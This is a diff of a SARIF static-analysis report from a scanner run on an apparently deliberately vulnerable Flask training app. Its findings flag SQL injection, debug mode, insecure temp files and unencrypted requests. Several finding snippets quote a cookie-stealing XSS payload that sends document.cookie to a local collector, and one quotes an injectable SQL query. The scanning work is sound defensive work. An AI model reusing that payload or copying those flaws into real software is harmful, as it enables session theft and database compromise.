                 "cwe": [
                   {
-                    "id": "CWE-798",
-                    "url": "https://cwe.mitre.org/data/definitions/798.html"
+                    "id": "CWE-89",
+                    "url": "https://cwe.mitre.org/data/definitions/89.html"
                   }
                 ],
                 "severity": "MEDIUM",
                 "kind": "FAIL",
                 "tags": [
-                  "CWE-798"
+                  "CWE-89"
+                ]
+              }
+            },
+            {
+              "id": "098e540c-ebd8-38e0-a921-65c5306aee54",
+              "name": "Potential Unsafe Use of Temporary File/Directory",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\n\"Potential Unsafe Use of Temporary File/Directory\" vulnerability in Python refers to the insecure creation or use of temporary files or directories. This can lead to a variety of security issues, such as race conditions, privilege escalation, or information disclosure, if an attacker can predict the name of the temporary file or directory and manipulate it.\n\nIn the provided code snippet, a temporary file is being created in a predictable location (`/tmp/acme.key`) with no checks for existing files or directories with the same name. This could allow an attacker to create a symbolic link with the same name, leading to the application writing to a different file than intended.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should use secure methods for creating temporary files or directories. Python's `tempfile` module provides several functions for this purpose, such as `tempfile.mkstemp()` and `tempfile.TemporaryFile()`. These functions create a temporary file with a unique name in a secure manner, preventing race conditions.\n\n## Source Code Fix Recommendation\n\nHere's how you can modify the provided code snippet to use `tempfile.mkstemp()`:\n\n```python\nimport tempfile\n\n# This will create a secure temporary file\nfd, path = tempfile.mkstemp()\n\nwith open(path, 'wb') as out:\n    # Your code here\n```\n\nIn this code, `tempfile.mkstemp()` creates a unique temporary file and returns a tuple containing an OS-level handle to the file and the absolute pathname of the file. The file is then opened for writing in binary mode.\n\n## Library Dependencies\n\nThe code example requires the following Python standard library:\n\n- `tempfile`\n\n## References\n\n- [OWASP - Insecure Temporary File](https://owasp.org/www-community/vulnerabilities/Insecure_Temporary_File)\n- [CWE-377: Insecure Temporary File](https://cwe.mitre.org/data/definitions/377.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-377",
+                    "url": "https://cwe.mitre.org/data/definitions/377.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-377"
                 ]
               }
             },
@@ -910,28 +932,6 @@
                 "kind": "FAIL",
                 "tags": [
                   "CWE-798"
-                ]
-              }
-            },
-            {
-              "id": "ecbd55a2-cc94-343e-aa5a-97ff01b5aa77",
-              "name": "\"Preventing SQL Injection: Use Prepared Statements, TextualSQL, SQL Expression Language, Schema Definition Language, or SQLAlchemy ORM\"",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe provided code is vulnerable to SQL Injection, a common security vulnerability that occurs when an attacker can insert malicious SQL statements into an SQL query. The vulnerability exists because the code directly uses string formatting to include user-supplied input in an SQL query. An attacker could exploit this by providing specially crafted input that modifies the SQL query to perform actions not intended by the developer, such as viewing, modifying, or deleting data.\n\n## Mitigation Advice\n\nTo prevent SQL Injection vulnerabilities, it's recommended to use parameterized queries or prepared statements, which can ensure that user-supplied input is always treated as literal data and not part of the SQL query itself. \n\nIn Python, you can use the `sqlite3` module's support for parameterized queries to mitigate this vulnerability. \n\n## Source Code Fix\n\nHere's how you could modify the provided code to use a parameterized query:\n\n```python\nc.execute(\"INSERT INTO users (username, password, salt, failures, mfa_enabled, mfa_secret) VALUES (?, ?, ?, ?, ?, ?)\", (username, '', '', 0, 0, ''))\n```\n\nIn this version of the code, the `?` characters are placeholders that `sqlite3` will replace with the values from the tuple that's passed as the second argument to `c.execute()`. Because `sqlite3` automatically escapes these values, they can't be used to modify the SQL query.\n\n## Library Dependencies\n\nThe provided code appears to use the `sqlite3` module, which is included in the Python standard library, so no additional library dependencies are required.\n\n## References\n\n- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')](https://cwe.mitre.org/data/definitions/89.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-89",
-                    "url": "https://cwe.mitre.org/data/definitions/89.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-89"
                 ]
               }
             },
@@ -1002,28 +1002,6 @@
               }
             },
             {
-              "id": "97e64c28-7e50-3f17-8d12-f4c95004c392",
-              "name": "Flask App Debug Mode Vulnerability Detected",
-              "helpUri": "https://www.glog.ai/",
-              "help": {
-                "text": "",
-                "markdown": "## Description\n\nThe Flask application is running in debug mode, which is a security risk. Debug mode should never be used in a production setting as it allows users to execute arbitrary Python code on your server. This is a serious security issue as it can lead to remote code execution (RCE) attacks.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should ensure that the debug mode is turned off in a production environment. This can be done by setting the debug attribute to False when calling the run method of the Flask application object.\n\n## Source Code Fix Recommendation\n\nHere is how you can fix the vulnerability in your code:\n\n```python\napp.run(debug=False, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n```\n\n## Library Dependencies\n\nThe code example requires the following Python library to execute properly:\n\n- Flask\n\n## References\n\n- [CWE-489: Active Debug Code](https://cwe.mitre.org/data/definitions/489.html)"
-              },
-              "properties": {
-                "cwe": [
-                  {
-                    "id": "CWE-489",
-                    "url": "https://cwe.mitre.org/data/definitions/489.html"
-                  }
-                ],
-                "severity": "MEDIUM",
-                "kind": "FAIL",
-                "tags": [
-                  "CWE-489"
-                ]
-              }
-            },
-            {
               "id": "2ff2030d-855f-3948-a4fb-62cb9d31c714",
               "name": "Detected Hardcoded `SECRET_KEY` Vulnerability",
               "helpUri": "https://www.glog.ai/",
@@ -1079,6 +1057,50 @@
       "language": "en-US",
       "results": [
         {
+          "ruleId": "e35cbb27-fe53-3d6d-aaf7-d174c5d92756",
+          "kind": "fail",
+          "level": "error",
+          "message": {
+            "text": "Flask App Debug Mode Vulnerability"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/vulpy-ssl.py"
+                },
+                "region": {
+                  "startLine": 29,
+                  "startColumn": 1,
+                  "endLine": 29,
+                  "endColumn": 87,
+                  "snippet": {
+                    "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n"
+                  }
+                },
+                "contextRegion": {
+                  "startLine": 28,
+                  "endLine": 29,
+                  "snippet": {
+                    "text": "\napp.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "b3e544930173610f94512078cb772a73f20cedc2c5577240155a3209c6422cd5",
+            "glog-pfp-ruleFileCode/v1": "d5938eb2792135c5f59506ecc4f975f1f259d9dd9220041187d998419c9a28e8"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "d5938eb2792135c5f59506ecc4f975f1f259d9dd9220041187d998419c9a28e8"
+          },
+          "properties": {
+            "issue_severity": "HIGH",
+            "issue_confidence": "MEDIUM"
+          }
+        },
+        {
           "ruleId": "8e4d21d7-f881-305d-b031-ef5f82af0dca",
           "kind": "fail",
           "level": "warning",
@@ -1114,83 +1136,39 @@
           "properties": {}
         },
         {
-          "ruleId": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
+          "ruleId": "a863a129-f894-3b6d-a8fe-740a9856d333",
           "kind": "fail",
           "level": "warning",
           "message": {
-            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+            "text": "Unencrypted HTTP Request Vulnerability Detected"
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "bad/payloads/cookie.js",
+                  "uri": "bad/api_list.py",
                   "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 1,
-                  "startColumn": 1,
-                  "endLine": 1,
-                  "endColumn": 69,
+                  "startLine": 10,
+                  "startColumn": 22,
+                  "endLine": 10,
+                  "endColumn": 74,
                   "snippet": {
-                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                    "text": "    r = requests.get('http://127.0.1.1:5000/api/post/{}'.format(username))"
                   }
                 }
               }
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "2fc432c7106e71489c37dd38fdc61e4a181b2c095e6e0e86cbdde077b0e927e5",
-            "glog-pfp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+            "glog-pfp-ruleFileLineCode/v1": "625072bc7765c02fd251e07434bf6f226709a03c9586bf9f81b87753066c110c",
+            "glog-pfp-ruleFileCode/v1": "0f306c976050c9402fa1ce5b729d24ad8b805006ad741f8f7682a902a2abfa73"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+            "glog-fp-ruleFileCode/v1": "0f306c976050c9402fa1ce5b729d24ad8b805006ad741f8f7682a902a2abfa73"
           },
           "properties": {}
-        },
-        {
-          "ruleId": "2cb06702-8e2a-3d19-b644-a78b05423288",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Potential Unsafe Use of Temporary File/Directory"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/api_post.py"
-                },
-                "region": {
-                  "startLine": 6,
-                  "startColumn": 21,
-                  "endLine": 6,
-                  "endColumn": 43,
-                  "snippet": {
-                    "text": "api_key_file = Path('/tmp/supersecret.txt')\n"
-                  }
-                },
-                "contextRegion": {
-                  "startLine": 5,
-                  "endLine": 7,
-                  "snippet": {
-                    "text": "\napi_key_file = Path('/tmp/supersecret.txt')\n\n"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "d21dead62378defecbd1596907c4ddc8d0c419971afed5af6b44102111e84238",
-            "glog-pfp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
-          },
-          "properties": {
-            "issue_severity": "MEDIUM",
-            "issue_confidence": "MEDIUM"
-          }
         },
         {
           "ruleId": "85228758-5529-311c-922c-8a99ba238656",
@@ -1224,76 +1202,6 @@
           },
           "fingerprints": {
             "glog-fp-ruleFileCode/v1": "9ef11240cbf15fa2dedcfee4654b6748ecb897aef01db39c7e24ab9bc71d5b1f"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/payloads/cookie.js",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 1,
-                  "startColumn": 1,
-                  "endLine": 1,
-                  "endColumn": 69,
-                  "snippet": {
-                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "72c4fdb4adcbb0bca23e0184bc19f1032cac40e9aec47ca4bc5750815b4cac0f",
-            "glog-pfp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "a863a129-f894-3b6d-a8fe-740a9856d333",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Unencrypted HTTP Request Vulnerability Detected"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/api_list.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 10,
-                  "startColumn": 22,
-                  "endLine": 10,
-                  "endColumn": 74,
-                  "snippet": {
-                    "text": "    r = requests.get('http://127.0.1.1:5000/api/post/{}'.format(username))"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "625072bc7765c02fd251e07434bf6f226709a03c9586bf9f81b87753066c110c",
-            "glog-pfp-ruleFileCode/v1": "0f306c976050c9402fa1ce5b729d24ad8b805006ad741f8f7682a902a2abfa73"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "0f306c976050c9402fa1ce5b729d24ad8b805006ad741f8f7682a902a2abfa73"
           },
           "properties": {}
         },
@@ -1335,6 +1243,50 @@
           },
           "fingerprints": {
             "glog-fp-ruleFileCode/v1": "6ed85d76567599e8fb710d19ed3653b40e57239fb9f3a7caaedfcdc532f0b934"
+          },
+          "properties": {
+            "issue_severity": "MEDIUM",
+            "issue_confidence": "MEDIUM"
+          }
+        },
+        {
+          "ruleId": "2cb06702-8e2a-3d19-b644-a78b05423288",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Potential Unsafe Use of Temporary File/Directory"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/api_post.py"
+                },
+                "region": {
+                  "startLine": 6,
+                  "startColumn": 21,
+                  "endLine": 6,
+                  "endColumn": 43,
+                  "snippet": {
+                    "text": "api_key_file = Path('/tmp/supersecret.txt')\n"
+                  }
+                },
+                "contextRegion": {
+                  "startLine": 5,
+                  "endLine": 7,
+                  "snippet": {
+                    "text": "\napi_key_file = Path('/tmp/supersecret.txt')\n\n"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "d21dead62378defecbd1596907c4ddc8d0c419971afed5af6b44102111e84238",
+            "glog-pfp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "018562b46e2b6c58f657f065467b631e2910d96c162fb6879e44ff9d6b2212d5"
           },
           "properties": {
             "issue_severity": "MEDIUM",
@@ -1412,48 +1364,74 @@
           "properties": {}
         },
         {
-          "ruleId": "e35cbb27-fe53-3d6d-aaf7-d174c5d92756",
+          "ruleId": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
           "kind": "fail",
-          "level": "error",
+          "level": "warning",
           "message": {
-            "text": "Flask App Debug Mode Vulnerability"
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "bad/vulpy-ssl.py"
+                  "uri": "good/payloads/cookie.js",
+                  "uriBaseId": "%SRCROOT%"
                 },
                 "region": {
-                  "startLine": 29,
+                  "startLine": 1,
                   "startColumn": 1,
-                  "endLine": 29,
-                  "endColumn": 87,
+                  "endLine": 1,
+                  "endColumn": 69,
                   "snippet": {
-                    "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n"
-                  }
-                },
-                "contextRegion": {
-                  "startLine": 28,
-                  "endLine": 29,
-                  "snippet": {
-                    "text": "\napp.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n"
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
                   }
                 }
               }
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "b3e544930173610f94512078cb772a73f20cedc2c5577240155a3209c6422cd5",
-            "glog-pfp-ruleFileCode/v1": "d5938eb2792135c5f59506ecc4f975f1f259d9dd9220041187d998419c9a28e8"
+            "glog-pfp-ruleFileLineCode/v1": "72c4fdb4adcbb0bca23e0184bc19f1032cac40e9aec47ca4bc5750815b4cac0f",
+            "glog-pfp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "d5938eb2792135c5f59506ecc4f975f1f259d9dd9220041187d998419c9a28e8"
+            "glog-fp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
           },
-          "properties": {
-            "issue_severity": "HIGH",
-            "issue_confidence": "MEDIUM"
-          }
+          "properties": {}
+        },
+        {
+          "ruleId": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/payloads/cookie.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 69,
+                  "snippet": {
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "2fc432c7106e71489c37dd38fdc61e4a181b2c095e6e0e86cbdde077b0e927e5",
+            "glog-pfp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+          },
+          "properties": {}
         },
         {
           "ruleId": "f4cd44b8-df7f-358c-ae49-115800bd61a3",
@@ -1500,7 +1478,42 @@
           }
         },
         {
-          "ruleId": "8fdc682e-a47e-338e-a4d6-13373398e33f",
+          "ruleId": "d5d8f528-c81c-3b5d-b331-e568a52293b8",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Possible SQL Injection Detected"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/db_init.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 20,
+                  "startColumn": 9,
+                  "endLine": 20,
+                  "endColumn": 151,
+                  "snippet": {
+                    "text": "        c.execute(\"INSERT INTO users (username, password, failures, mfa_enabled, mfa_secret) VALUES ('%s', '%s', '%d', '%d', '%s')\" %(u, p, 0, 0, ''))"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "61b867863db04b7c2878cd8f6c772008cfd51df4d0d60d6c071663c528dfa333",
+            "glog-pfp-ruleFileCode/v1": "89c4e0dd4cb9c6c8cd58c56f4f20a377684b6b55b1d768908a90cac51d66939f"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "89c4e0dd4cb9c6c8cd58c56f4f20a377684b6b55b1d768908a90cac51d66939f"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "563d99e8-bbca-3a4d-b821-042b6999c80e",
           "kind": "fail",
           "level": "warning",
           "message": {
@@ -1514,9 +1527,9 @@
                 },
                 "region": {
                   "startLine": 29,
-                  "startColumn": 52,
+                  "startColumn": 70,
                   "endLine": 29,
-                  "endColumn": 68,
+                  "endColumn": 85,
                   "snippet": {
                     "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))\n"
                   }
@@ -1532,86 +1545,16 @@
             }
           ],
           "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "41262a7563c5d3f680c0933ccf94908e09c7e341f10f725487709b49bbbb1061",
-            "glog-pfp-ruleFileCode/v1": "fe418a42ecefb1eab3c22b5e2316b90cb4e019ea9ad9eda1eb1d1059e9fb9a2c"
+            "glog-pfp-ruleFileLineCode/v1": "fc1a963d2e3647589d1f4006e781afac5371fb51bc0235974d5eb8017bb83957",
+            "glog-pfp-ruleFileCode/v1": "60f3f4d1f309eb9798e2b279649b23075835bc46941a3633e7a27e00613d86ae"
           },
           "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "fe418a42ecefb1eab3c22b5e2316b90cb4e019ea9ad9eda1eb1d1059e9fb9a2c"
+            "glog-fp-ruleFileCode/v1": "60f3f4d1f309eb9798e2b279649b23075835bc46941a3633e7a27e00613d86ae"
           },
           "properties": {
             "issue_severity": "MEDIUM",
             "issue_confidence": "MEDIUM"
           }
-        },
-        {
-          "ruleId": "5b636fe0-2a63-39b7-aa68-22c0bb5aada8",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/vulpy-ssl.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 29,
-                  "startColumn": 1,
-                  "endLine": 29,
-                  "endColumn": 87,
-                  "snippet": {
-                    "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "b3dcc846bf55e554ec50c96114057b6d9567f3ca615f43ad172a343db26ef894",
-            "glog-pfp-ruleFileCode/v1": "19bdf6311e66a4006bb7627b04879b8816aa922af8464660bca6c81d2b446920"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "19bdf6311e66a4006bb7627b04879b8816aa922af8464660bca6c81d2b446920"
-          },
-          "properties": {}
-        },
-        {
-          "ruleId": "232084fd-c209-3fd2-ad2f-5888b440fb18",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/vulpy.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 55,
-                  "startColumn": 1,
-                  "endLine": 55,
-                  "endColumn": 72,
-                  "snippet": {
-                    "text": "app.run(debug=True, host='127.0.1.1', port=5000, extra_files='csp.txt')"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "17437a9e75507e2ca2dd2fb68d19a3e098d133c193bf7005d81089f2b6b53a24",
-            "glog-pfp-ruleFileCode/v1": "b9c68fd2d8b7e1ae61bbb075dee17935b5510efa27138a255e4998285f0e650a"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "b9c68fd2d8b7e1ae61bbb075dee17935b5510efa27138a255e4998285f0e650a"
-          },
-          "properties": {}
         },
         {
           "ruleId": "71b9100a-299c-332c-9903-619e358cce2a",
@@ -1658,6 +1601,76 @@
           }
         },
         {
+          "ruleId": "232084fd-c209-3fd2-ad2f-5888b440fb18",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Flask App Debug Mode Vulnerability Detected"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/vulpy.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 55,
+                  "startColumn": 1,
+                  "endLine": 55,
+                  "endColumn": 72,
+                  "snippet": {
+                    "text": "app.run(debug=True, host='127.0.1.1', port=5000, extra_files='csp.txt')"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "17437a9e75507e2ca2dd2fb68d19a3e098d133c193bf7005d81089f2b6b53a24",
+            "glog-pfp-ruleFileCode/v1": "b9c68fd2d8b7e1ae61bbb075dee17935b5510efa27138a255e4998285f0e650a"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "b9c68fd2d8b7e1ae61bbb075dee17935b5510efa27138a255e4998285f0e650a"
+          },
+          "properties": {}
+        },
+        {
+          "ruleId": "5b636fe0-2a63-39b7-aa68-22c0bb5aada8",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Flask Ignores Top-Level app.run(...): Suggests Using a Guard Function"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/vulpy-ssl.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 29,
+                  "startColumn": 1,
+                  "endLine": 29,
+                  "endColumn": 87,
+                  "snippet": {
+                    "text": "app.run(debug=True, host='127.0.1.1', ssl_context=('/tmp/acme.cert', '/tmp/acme.key'))"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "b3dcc846bf55e554ec50c96114057b6d9567f3ca615f43ad172a343db26ef894",
+            "glog-pfp-ruleFileCode/v1": "19bdf6311e66a4006bb7627b04879b8816aa922af8464660bca6c81d2b446920"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "19bdf6311e66a4006bb7627b04879b8816aa922af8464660bca6c81d2b446920"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "fe7f9f06-1528-3e67-ada4-c6ac1ffac636",
           "kind": "fail",
           "level": "warning",
@@ -1691,50 +1704,6 @@
             "glog-fp-ruleFileCode/v1": "9b14dfc38837d7dc35df6cdc85f7fd3318d925df83ef5330d36769c1e1d1d452"
           },
           "properties": {}
-        },
-        {
-          "ruleId": "4f64a990-7b21-3786-a407-06b9f07b7c18",
-          "kind": "fail",
-          "level": "error",
-          "message": {
-            "text": "Flask App Debug Mode Vulnerability"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "bad/vulpy.py"
-                },
-                "region": {
-                  "startLine": 55,
-                  "startColumn": 1,
-                  "endLine": 55,
-                  "endColumn": 72,
-                  "snippet": {
-                    "text": "app.run(debug=True, host='127.0.1.1', port=5000, extra_files='csp.txt')\n"
-                  }
-                },
-                "contextRegion": {
-                  "startLine": 54,
-                  "endLine": 55,
-                  "snippet": {
-                    "text": "\napp.run(debug=True, host='127.0.1.1', port=5000, extra_files='csp.txt')\n"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "e099fe828cb76196e87dfba67b9f1128c02ab18acae8b3623e871921cb65c753",
-            "glog-pfp-ruleFileCode/v1": "cdb7632d09e97dac73950cc641dd17e0f54e0953604ce4e818e4f8bb6a6491a3"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "cdb7632d09e97dac73950cc641dd17e0f54e0953604ce4e818e4f8bb6a6491a3"
-          },
-          "properties": {
-            "issue_severity": "HIGH",
-            "issue_confidence": "MEDIUM"
-          }
         },
         {
           "ruleId": "0b7a99b4-af3d-33bd-9df1-37068305d5de",
@@ -1781,41 +1750,6 @@
           }
         },
         {
-          "ruleId": "e7f4a97b-a66c-3cec-baaf-d9a955d42809",
-          "kind": "fail",
-          "level": "warning",
-          "message": {
-            "text": "Unencrypted HTTP Request Vulnerability Detected"
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "good/httpbrute.py",
-                  "uriBaseId": "%SRCROOT%"
-                },
-                "region": {
-                  "startLine": 22,
-                  "startColumn": 30,
-                  "endLine": 22,
-                  "endColumn": 33,
-                  "snippet": {
-                    "text": "    response = requests.post(URL, data = {'username': username, 'password': password})"
-                  }
-                }
-              }
-            }
-          ],
-          "partialFingerprints": {
-            "glog-pfp-ruleFileLineCode/v1": "ac50788a4dd0160585f90b5857333a150d17a2183d2498553cc83b2f13b0758a",
-            "glog-pfp-ruleFileCode/v1": "e7f6b38da2fe97ea350366c1ac087be59be89bfa9ab01059d0a04a689c94c6c5"
-          },
-          "fingerprints": {
-            "glog-fp-ruleFileCode/v1": "e7f6b38da2fe97ea350366c1ac087be59be89bfa9ab01059d0a04a689c94c6c5"
-          },
-          "properties": {}
-        },
-        {
           "ruleId": "3c96fede-b110-3e6c-b95e-85f8bb7f9fea",
           "kind": "fail",
           "level": "warning",
@@ -1860,6 +1794,41 @@
           }
         },
         {
+          "ruleId": "e7f4a97b-a66c-3cec-baaf-d9a955d42809",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "Unencrypted HTTP Request Vulnerability Detected"
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/httpbrute.py",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 22,
+                  "startColumn": 30,
+                  "endLine": 22,
+                  "endColumn": 33,
+                  "snippet": {
+                    "text": "    response = requests.post(URL, data = {'username': username, 'password': password})"
+                  }
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "ac50788a4dd0160585f90b5857333a150d17a2183d2498553cc83b2f13b0758a",
+            "glog-pfp-ruleFileCode/v1": "e7f6b38da2fe97ea350366c1ac087be59be89bfa9ab01059d0a04a689c94c6c5"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "e7f6b38da2fe97ea350366c1ac087be59be89bfa9ab01059d0a04a689c94c6c5"
+          },
+          "properties": {}
+        },
+        {
           "ruleId": "48bed64a-eabe-3746-8939-163ba7203552",
           "kind": "fail",
           "level": "warning",
@@ -1891,6 +1860,76 @@
           },
           "fingerprints": {
